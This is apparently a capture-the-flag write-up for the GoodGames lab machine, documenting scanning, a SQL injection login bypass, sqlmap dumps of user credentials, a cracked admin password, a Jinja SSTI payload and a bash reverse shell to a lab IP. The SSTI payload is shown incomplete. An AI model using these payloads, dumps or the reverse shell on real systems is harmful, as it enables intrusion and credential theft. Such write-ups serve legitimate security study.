# nmap
## nmap all ports
![](https://github.com/xenotim/CTF/blob/main/GoodGames/screenshots/nmap%20port%20scan.png)

# gobuster
## gobuster main
![](https://github.com/xenotim/CTF/blob/main/GoodGames/screenshots/gobuster-main.png)

# domain

## goodgame.htb/blog
![](https://github.com/xenotim/CTF/blob/main/GoodGames/screenshots/goodgames.htb.blog.png)

## STORE: site is in progress, nothing interesting
![](https://github.com/xenotim/CTF/blob/main/GoodGames/screenshots/goodgames.htb.coming-soon.png)

Login Panel: goodgames.htb
mail: @ is required and therefore not sqli testable --> intercept with burp 
![](https://github.com/xenotim/CTF/blob/main/GoodGames/screenshots/goodgames%20login%20page.png)

Try simple sqli in login creds 
sqli:  'or 1=1-- -

## Intercept
![](https://github.com/xenotim/CTF/blob/main/GoodGames/screenshots/burpsuite%20login%20intercept.png)

## Payload
![](https://github.com/xenotim/CTF/blob/main/GoodGames/screenshots/burpsuite%20sqli%20success.png)

//Succesfull payload:   ' or 1=1-- -
## Succesfull login
![](https://github.com/xenotim/CTF/blob/main/GoodGames/screenshots/domain%20login%20successful.png)

## Dashboard
![](https://github.com/xenotim/CTF/blob/main/GoodGames/screenshots/goodgames%20dashboard.png)

## new subdomain: internal-administration.goodgames.htb
![](https://github.com/xenotim/CTF/blob/main/GoodGames/screenshots/goodgames%20unknown%20host.png)

## Again a login
## Try creds found by sqlmap: admin:superadministrator
![](https://github.com/xenotim/CTF/blob/main/GoodGames/screenshots/internal-administration.goodgames.htb.login.png)

# sqlmap
//dump databases
````
sqlmap -r request-login.txt --dbs

`````

## database snippet
![](https://github.com/xenotim/CTF/blob/main/GoodGames/screenshots/sqlmap%20databases.png)

dump database main and its tables entrys
````
sqlmap -r request-login.txt -D main --tables

## speed it up

sqlmap -r request-login.txt --dbs --threads 10 --time-sec 1
`````

## database main tables
![](https://github.com/xenotim/CTF/blob/main/GoodGames/screenshots/sqlmap%20database%20main%20tables.png)
dump user table
````
sqlmap -r request-login.txt -D main -T user --dump

## speed it up

sqlmap -r request-login.txt -D main -T user --dump --threads 10 --time-sec 1
`````
## receive creds from database
![](https://github.com/xenotim/CTF/blob/main/GoodGames/screenshots/sqlmap%20creds.png)

## crackstation
![](https://github.com/xenotim/CTF/blob/main/GoodGames/screenshots/crackstation%20admin%20hash.png)

## internal.administration dashboard
![](https://github.com/xenotim/CTF/blob/main/GoodGames/screenshots/internal%20admnistration%20dashboard.png)

## Flask application dashborar in settings: SSTI {{7*7}} = 49
![](Pasted image 20220913185124.png)

![](https://github.com/xenotim/CTF/blob/main/GoodGames/screenshots/ssti%20reflected.png)


![](https://github.com/xenotim/CTF/blob/main/GoodGames/screenshots/ssti%20payloads%20to%20rce.png)

ssti payload: make http server in www and host index.html file.
index.html content: 
````

{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('10.10.14.7').read() }}

````
make dir www with index.html file:
````
bash -i >& /dev/tcp/10.10.14.5/1111 0>&1

`````

![](python3 http server on port 80.png)

![](https://github.com/xenotim/CTF/blob/main/GoodGames/screenshots/docker%20shell.png)

ls -la on entrypoint of shell shows dockerfile!
![](initial shell list files.png)
augustus got user name: 1000 --> docker?
mount shows that the home directory is mounted
![](https://github.com/xenotim/CTF/blob/main/GoodGames/screenshots/home.augustus%20is%20mounted.png)

internal ip of docker: 172.19.0.2
![](https://github.com/xenotim/CTF/blob/main/GoodGames/screenshots/shell%20list%20networks.png)


nmap isnt installed on machine; make own bash script like this:
````
for port in $(seq 1 1000); do (echo "blah" > /dev/tcp/172.19.0.1/$port && echo "open - $port") 2>/dev/null; done

`````
writes blah to the port and if succeeds (&&) it will print open port

![](https://github.com/xenotim/CTF/blob/main/GoodGames/screenshots/bash%20custom%20port%20scanner.png)




XXXXXXXXXXXX